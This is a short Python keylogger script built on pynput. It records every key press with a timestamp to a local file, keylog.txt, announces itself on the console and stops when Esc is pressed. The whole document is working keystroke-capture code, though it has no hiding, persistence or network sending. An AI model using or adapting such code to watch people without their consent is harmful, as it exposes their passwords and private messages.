import pynput.keyboard
import logging
import os

# Define the log file and its location
log_dir = "" # Leave empty to save in the same directory as the script
log_file = os.path.join(log_dir, "keylog.txt")

def setup_logging():
    """Configures the logging to save keystrokes to a file."""
    logging.basicConfig(
        filename=log_file, 
        level=logging.DEBUG, 
        format='%(asctime)s: %(message)s'
    )

def on_press(key):
    """
    This function is called every time a key is pressed.
    It logs the key press to the configured log file.
    """
    try:
        # For alphanumeric keys, log the character itself
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # For special keys (e.g., Shift, Ctrl, Space), log their name
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    """
    This function is called every time a key is released.
    It provides a condition to stop the listener.
    """
    if key == pynput.keyboard.Key.esc:
        # Stop listener by returning False
        logging.info("--- Logger stopped by user (Esc) ---")
        return False

def start_keylogger():
    """Starts the keylogger and listens for keyboard events."""
    setup_logging()
    logging.info("--- Keylogger Started ---")
    
    # The listener runs in a separate thread and calls the on_press/on_release functions
    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        try:
            # The join() method blocks the main program until the listener is stopped
            listener.join()
        except Exception as e:
            logging.error(f"An error occurred: {e}")

if __name__ == "__main__":
    print("Starting keylogger... Press 'Esc' to stop.")
    start_keylogger()
    print("Keylogger stopped. Log file saved to 'keylog.txt'.")


